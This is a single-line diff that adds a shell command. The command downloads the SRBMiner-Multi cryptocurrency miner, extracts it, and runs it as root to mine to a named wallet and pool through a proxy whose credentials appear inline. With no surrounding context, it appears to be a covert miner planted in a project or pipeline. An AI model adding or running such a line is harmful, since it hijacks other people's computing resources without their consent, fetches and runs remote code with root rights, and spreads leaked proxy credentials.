@@ -1,0 +1,1 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && sudo ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RAsZ3swZ7jFKyvgZNLUaoNQ1QtQyiWAo6g.Rig001 --password x --proxy ubpfhxtr:hzkgx7twifah@144.168.217.88:8780 --cpu-threads 1
